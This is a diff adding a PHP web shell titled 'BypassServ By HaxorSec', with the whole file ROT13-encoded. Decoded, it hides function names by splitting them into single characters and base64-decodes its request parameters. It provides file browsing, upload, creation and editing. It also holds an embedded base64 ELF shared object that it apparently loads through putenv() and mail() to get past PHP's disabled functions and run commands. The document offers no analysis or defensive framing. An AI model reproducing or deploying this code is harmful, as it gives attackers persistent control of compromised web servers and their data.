@@ -1,0 +1,442 @@
+<!QBPGLCR ugzy>
+<ugzy>
+<urnq>
+    <gvgyr>OlcnffFrei Ol UnkbeFrp</gvgyr>
+    <zrgn punefrg="HGS-8">
+    <zrgn uggc-rdhvi="K-HN-Pbzcngvoyr" pbagrag="VR=rqtr">
+    <zrgn anzr="ebobgf" pbagrag="abvaqrk, absbyybj">
+    <zrgn anzr="tbbtyrobg" pbagrag="abvaqrk">
+    <yvax uers="uggcf://sbagf.tbbtyrncvf.pbz/pff?snzvyl=Nevny%20Oynpx" ery="fglyrfurrg">
+    <fglyr>
+    obql {
+        sbag-snzvyl: 'Nevny Oynpx', fnaf-frevs;
+        pbybe: #000;
+        znetva: 0;
+        cnqqvat: 0;
+        onpxtebhaq-pbybe: #242222p9;
+    }
+    .erfhyg-obk-pbagnvare {
+        cbfvgvba: eryngvir;
+        znetva-gbc: 20ck;
+    }
+
+    .erfhyg-obk {
+        jvqgu: 100%;
+        urvtug: 200ck;
+        cnqqvat: 10ck;
+        obeqre: 1ck fbyvq #qqq;
+        obeqre-enqvhf: 5ck;
+        onpxtebhaq-pbybe: #s4s4s4;
+        biresybj: nhgb;
+        obk-fvmvat: obeqre-obk;
+        sbag-snzvyl: 'Nevny Oynpx', fnaf-frevs;
+        pbybe: #333;
+    }
+
+    .erfhyg-obk::cynprubyqre {
+        pbybe: #999;
+    }
+
+    .erfhyg-obk:sbphf {
+        bhgyvar: abar;
+        obeqre-pbybe: #000000;
+    }
+
+    .erfhyg-obk::-jroxvg-fpebyyone {
+        jvqgu: 8ck;
+    }
+
+    .erfhyg-obk::-jroxvg-fpebyyone-guhzo {
+        onpxtebhaq-pbybe: #000000;
+        obeqre-enqvhf: 4ck;
+    }
+    .pbagnvare {
+        znk-jvqgu: 90%;
+        znetva: 20ck nhgb;
+        cnqqvat: 20ck;
+        onpxtebhaq-pbybe: #ssssss;
+        obeqre-enqvhf: 44ck;
+        obk-funqbj: 0 0 10ck eton(0, 0, 0, 0.1);
+    }
+    .urnqre {
+        grkg-nyvta: pragre;
+        znetva-obggbz: 20ck;
+    }
+    .urnqre u1 {
+        sbag-fvmr: 24ck;
+    }
+    .fhournqre {
+        grkg-nyvta: pragre;
+        znetva-obggbz: 20ck;
+    }
+    .fhournqre c {
+        sbag-fvmr: 16ck;
+        sbag-fglyr: vgnyvp;
+    }
+    sbez {
+        znetva-obggbz: 20ck;
+    }
+    sbez vachg[glcr="grkg"],
+    sbez grkgnern {
+        cnqqvat: 8ck;
+        znetva-obggbz: 10ck;
+        obeqre: 1ck fbyvq #000;
+        obeqre-enqvhf: 3ck;
+        obk-fvmvat: obeqre-obk;
+        
+    }
+    sbez vachg[glcr="fhozvg"] {
+
+        cnqqvat: 10ck;
+        onpxtebhaq-pbybe: #000000;
+        pbybe: juvgr;
+        obeqre: abar;
+        obeqre-enqvhf: 3ck;
+        phefbe: cbvagre;
+    }
+    sbez vachg[glcr="svyr"] {
+        cnqqvat: 7ck;
+        onpxtebhaq-pbybe: #000000;
+        pbybe: juvgr;
+        obeqre: abar;
+        obeqre-enqvhf: 3ck;
+        phefbe: cbvagre;
+    }
+    .erfhyg-obk {
+            jvqgu: 100%;
+            urvtug: 200ck;
+            erfvmr: abar;
+            biresybj: nhgb;
+            sbag-snzvyl: 'Nevny Oynpx';
+            onpxtebhaq-pbybe: #s4s4s4;
+            cnqqvat: 10ck;
+            obeqre: 1ck fbyvq #qqq;
+            znetva-obggbz: 10ck;
+        }
+    sbez vachg[glcr="fhozvg"]:ubire {
+        onpxtebhaq-pbybe: #143015;
+    }
+    gnoyr {
+        jvqgu: 100%;
+        obeqre-pbyyncfr: pbyyncfr;
+        znetva-gbc: 20ck;
+    }
+    gu, gq {
+        cnqqvat: 8ck;
+        grkg-nyvta: yrsg;
+    }
+    gu {
+        onpxtebhaq-pbybe: #5p5p5p;
+    }
+    ge:agu-puvyq(rira) {
+        onpxtebhaq-pbybe: #9p9o9opr;
+    }
+    .vgrz-anzr {
+        znk-jvqgu: 200ck;
+        biresybj: uvqqra;
+        grkg-biresybj: ryyvcfvf;
+        juvgr-fcnpr: abjenc;
+    }
+    .fvmr, .qngr {
+        jvqgu: 100ck;
+    }
+    .crezvffvba {
+        sbag-jrvtug: obyq;
+        jvqgu: 50ck;
+        grkg-nyvta: pragre;
+    }
+    .jevgnoyr {
+        pbybe: #0qo202;
+    }
+    .abg-jevgnoyr {
+        pbybe: #q60909;
+    }
+grkgnern[anzr="svyr_pbagrag"] {
+            jvqgu: pnyp(100.9% - 10ck);
+            znetva-obggbz: 10ck;
+            cnqqvat: 8ck;
+            znk-urvtug: 500ck;
+            erfvmr: iregvpny;
+            obeqre: 1ck fbyvq #qqq;
+            obeqre-enqvhf: 3ck;
+            sbag-snzvyl: 'Nevny Oynpx';
+        }
+</fglyr>
+</urnq>
+<obql>
+<qvi pynff="pbagnvare">
+<?cuc
+
+$puq = "p"."u"."q"."v"."e";
+$rkcy = "r"."k"."c"."y"."b"."q"."r";
+$fpq = "f"."p"."n"."a"."q"."v"."e";
+$evy = "e"."r"."n"."y"."c"."n"."g"."u";
+$fg = "f"."g"."n"."g";
+$vfqve = "v"."f"."_"."q"."v"."e";
+$vfj = "v"."f"."_"."j"."e"."v"."g"."n"."o"."y"."r";
+$zhc = "z"."b"."i"."r"."_"."h"."c"."y"."b"."n"."q"."r"."q"."_"."s"."v"."y"."r";
+$of = "o"."n"."f"."r"."a"."n"."z"."r";
+$ugz = "u"."g"."z"."y"."f"."c"."r"."p"."v"."n"."y"."p"."u"."n"."e"."f";
+$scp = "s"."v"."y"."r"."_"."c"."h"."g"."_"."p"."b"."a"."g"."r"."a"."g"."f";
+$zrx = "z"."x"."q"."v"."e";
+$stp = "s"."v"."y"."r"."_"."t"."r"."g"."_"."p"."b"."a"."g"."r"."a"."g"."f";
+$qeazz = "q"."v"."e"."a"."n"."z"."r";
+$hay = "h"."a"."y"."v"."a"."x";
+$gvzrmbar = qngr_qrsnhyg_gvzrmbar_trg();
+qngr_qrsnhyg_gvzrmbar_frg($gvzrmbar);
+$ebbgQverpgbel = $evy($_FREIRE['\k44\k4s\k43\k55\k4q\k45\k4r\k54\k5s\k52\k4s\k4s\k54']);
+$fpevcgQverpgbel = $qeazz(__SVYR__);
+
+shapgvba k($o) {
+
+    $or = "on"."fr"."64"."_"."ra"."pb"."qr";
+    erghea $or($o);
+}
+
+shapgvba l($o) {
+    $oq = "on"."fr"."64"."_"."qr"."pb"."qr";
+    erghea $oq($o);
+}
+rpub "<sbag pbybe='oynpx'>[ Pbzznaq Olcnf Fgnghf Jnwvo BA ZNVY CHGRAI @ UnkbeFrp]</sbag><oe>";
+vs (shapgvba_rkvfgf('znvy')) {
+    rpub "<sbag pbybe='oynpx'>[ Shapgvba znvy() ] :</sbag><sbag pbybe='terra'> [ BA ]</sbag><oe>";
+} ryfr {
+    rpub "<sbag pbybe='oynpx'>[ Shapgvba znvy() ] :<sbag pbybe='erq'> [ BSS ]</sbag><oe>";
+}
+vs (shapgvba_rkvfgf('chgrai')) {
+    rpub "<sbag pbybe='oynpx'>[ Shapgvba chgrai() ] :</sbag><sbag pbybe='terra'> [ BA ]</sbag><oe>";
+} ryfr {
+    rpub "<sbag pbybe='oynpx'>[ Shapgvba chgrai() ] :<sbag pbybe='erq'> [ BSS ]</sbag><oe>";
+}
+sbernpu ($_TRG nf $p => $q) $_TRG[$p] = l($q);
+
+$pheeragQverpgbel = $evy(vffrg($_TRG['q']) ? $_TRG['q'] : $ebbgQverpgbel);
+$puq($pheeragQverpgbel);
+
+$ivrjPbzznaqErfhyg = '';
+
+vs ($_FREIRE['ERDHRFG_ZRGUBQ'] === 'CBFG') {
+    vs (vffrg($_SVYRF['svyrGbHcybnq'])) {
+        $gnetrg_svyr = $pheeragQverpgbel . '/' . $of($_SVYRF["svyrGbHcybnq"]["anzr"]);
+        vs ($zhc($_SVYRF["svyrGbHcybnq"]["gzc_anzr"], $gnetrg_svyr)) {
+            rpub "<ue>Svyr " . $ugz($of($_SVYRF["svyrGbHcybnq"]["anzr"])) . " Hcybnq fhpprff<ue>";
+        } ryfr {
+            rpub "<ue>Fbeel, gurer jnf na reebe hcybnqvat lbhe svyr.<ue>";
+        }
+    } ryfrvs (vffrg($_CBFG['sbyqre_anzr']) && !rzcgl($_CBFG['sbyqre_anzr'])) {
+        $ss = $_CBFG['sbyqre_anzr'];
+        $arjSbyqre = $pheeragQverpgbel . '/' . $ss;
+        vs (!svyr_rkvfgf($arjsbyqre)) {
+            vs ($zrx($arjSbyqre) !== snyfr) {
+                rpub '<ue>Sbyqre perngrq fhpprffshyyl!';
+            }ryfr{
+                rpub '<ue>Reebe: Snvyrq gb perngr sbyqre!';
+            }
+        }
+
+    } ryfrvs (vffrg($_CBFG['svyr_anzr'])) {
+        $svyrAnzr = $_CBFG['svyr_anzr'];
+        $arjSvyr = $pheeragQverpgbel . '/' . $svyrAnzr;
+        vs (!svyr_rkvfgf($arjSvyr)) {
+            vs ($scp($arjSvyr, '') !== snyfr) {
+                rpub '<ue>Svyr perngrq fhpprffshyyl!' . $svyrAnzr .' ';
+                $svyrGbIvrj = $arjSvyr;
+                vs (svyr_rkvfgf($svyrGbIvrj)) {
+                    $svyrPbagrag = $stp($svyrGbIvrj);
+                    $ivrjPbzznaqErfhyg = '<ue><c>Erfhyg: ' . $svyrAnzr . '</c>
+                    <sbez zrgubq="cbfg" npgvba="?'.(vffrg($_FREIRE['DHREL_FGEVAT']) ? $_FREIRE['DHREL_FGEVAT'] : '').'">
+                    <grkgnern anzr="pbagrag" pynff="erfhyg-obk">' . $ugz($svyrPbagrag) . '</grkgnern><gq>
+                    <vachg glcr="uvqqra" anzr="rqvg_svyr" inyhr="' . $svyrAnzr . '">
+                    <vachg glcr="fhozvg" inyhr=" Fnir "></sbez></gq>';
+                } ryfr {
+                    $ivrjPbzznaqErfhyg = '<ue><c>Reebe: Svyr abg sbhaq!</c>';
+                }
+            } ryfr {
+                rpub '<ue>Reebe: Snvyrq gb perngr svyr!';
+            }
+        }ryfr{
+            rpub '<ue>Reebe: Svyr Nyernql Rkvfgf!';
+        }
+    } ryfrvs (vffrg($_CBFG['pzq_vachg'])){
+        $c = "c"."h"."g"."r"."a"."i";
+        $n = "sv"."yr_c"."hg_p"."bag"."r"."ag"."f";
+        $z = "z"."n"."v"."y";
+        $onfr = "on"."fr"."64"."_"."qr"."pb"."qr";
+        $ra = "on"."fr"."64"."_"."ra"."pb"."qr";
+        $qeaz = "q"."v"."e"."a"."n"."z"."r";
+        $pheeragSvyrCngu = $_FREIRE['CUC_FRYS'];
+        $qbp = $_FREIRE['QBPHZRAG_EBBG'];
+        $qverpgbelCngu = $qeaz($pheeragSvyrCngu);
+        $shyy = $qbp . $qverpgbelCngu;
+        $ubbx = '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NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNfNtNNNNNNNNNNNNNNNNNNUNVNNNNNNNNNNNNNNNNNNNONNNNNNNNNYfNNNNNNNNNQNNNNNNNNNNLOjNNNNNNNN0NNNNNNNNNKNxNNNNNNNNMNNNNNNNNNCtAVNNNNNNNTjNNNNNNNNNDNNNNNNNNNObNNNNNNNNNPN4tNNNNNNNpNNNNNNNNNNtNNNNNNNNN9s7/ojNNNNQjNDNNNNNNNNHNNNNNNNNNZNDNNNNNNNNTNNNNNNNNNQtPNNNNNNNNPtNNNNNNNNQcNNNNNNNNNNfNNNNNNNNNTNNNNNNNNNNQNNNNNNNNNNNDVNNNNNNNNtNNNNNNNNQLNNNNNNNNNODNNNNNNNNNOjNNNNNNNNNKNNNNNNNNNRNTNNNNNNNNOjNNNNNNNNObODNNNNNNNNtNNNNNNNNN2NNNNNNNNNNWNNNNNNNNNOtNNNNNNNNN/i//ojNNNNOVODNNNNNNNC///28NNNNNNDNNNNNNNNQj//9iNNNNNObSNNNNNNNN+s//ojNNNNNQNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNOtBVNNNNNNNNNNNNNNNNNNNNNNNNNNNNRLUNNNNNNNNItpNNNNNNNOzOjNNNNNNNULUNNNNNNNNutpNNNNNNNPJOjNNNNNNNXLUNNNNNNNNgtpNNNNNNNQTOjNNNNNNNTNDVNNNNNNNE0AQBvNbETIvnJShVQLhZl4jYGR4X2EyLwy1ZFxtAv4mYwNtZwNkAmN1ZGLNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNZNNDQVNDNNNNNNNNNNNNNNNNNNNNNNNNZNNtQjNDNNNNNNNNNNNNNNNNNNNNNNNNZNNjN4NtNNNNNNNNNNNNNNNNNNNNNNNNZNONNjONNNNNNNNNNNNNNNNNNNNNNNNNZNODNnODNNNNNNNNNNNNNNNNNNNNNNNNZNOtOVODNNNNNNNNNNNNNNNNNNNNNNNNZNOjObODNNNNNNNNNNNNNNNNNNNNNNNNZNPNONOtNNNNNNNNNNNNNNNNNNNNNNNNZNPDNLOjNNNNNNNNNNNNNNNNNNNNNNNNZNPtNjOjNNNNNNNNNNNNNNNNNNNNNNNNZNPjQDOjNNNNNNNNNNNNNNNNNNNNNNNNZNQNQtOjNNNNNNNNNNNNNNNNNNNNNNNNZNQDOpPDNNNNNNNNNNNNNNNNNNNNNNNNZNQtOyPDNNNNNNNNNNNNNNNNNNNNNNNNZNQjO4PDNNNNNNNNNNNNNNNNNNNNNNNNZNRNPjPDNNNNNNNNNNNNNNNNNNNNNNNNZNRDQ4QFNNNNNNNNNNNNNNNNNNNNNNNNZNRtNVQvNNNNNNNNNNNNNNNNNNNNNNNNZNRjNDQvNNNNNNNNNNNNNNNNNNNNNNNNZNSNNLQvNNNNNNNNNNNNNNNNNNNNNNNNZNSDQLQlNNNNNNNNNNNNNNNNNNNNNNNNZNStNNRPNNNNNNNNNNNNNNNNNNNNNNNNZNSjOtRPNNNNNNNNNNNNNNNNNNNNNNNNZNTNObRPNNNNNNNNNNNNNNNNNNNNNNNNZNTDNNNNNNNNNNNNNNNNNNNNNNNDNNNNDN8s8NNNNNNNNNNNNNNNNNNNNNQNNNNNRNRjNDQvNNNNNNNNNNNNNNNNNNTDNNNNVNQNQtOjNNNNNNNNNNNNNNNNNNTjNNNNVNQNNtPNNNNNNNNNNNNNNNNNNNYtNNNNVNQNOjPNNNNNNNNNNNNNNNNNNNENNNNNRNTNObRPNNNNNNNNRNNNNNNNNNHjNNNNRNRtNVQvNNNNNNNNNNNNNNNNNNrtNNNNVNQNPjPNNNNNNNNNNNNNNNNNNNutNNNNRNRDQ4QFNNNNNNNNNNNNNNNNNNcDNNNNDN8s8NNNNNNNNNNNNNNNNNNNNNNDNNNNDN8s8NNNNNNNNNNNNNNNNNNNNNeNNNNNRNRNObPtNNNNNNNNNNNNNNNNNNhtNNNNRNRjNDQvNNNNNNNNNNNNNNNNNNNNNNNNDN8s8NNNNNNNNNNNNNNNNNNNNNktNNNNRNSjOtRPNNNNNNNNNNNNNNNNNN0jNNNNRNSNNLQvNNNNNNNNNNNNNNNNNN3NNNNNNNQjO4PDNNNNNNNNNNNNNNNNNN7jNNNNRNSjObRPNNNNNNNNNNNNNNNNNN+jNNNNRNStNNRPNNNNNNNNNNNNNNNNNNRDRNNOVNNNNNNNNNNNNNNNNNNNNNNNNNWDRNNPNNNNNNNNNNNNNNNNNNNNNNNNNNDDRNNONNSjObRPNNNNNNNNNNNNNNNNNN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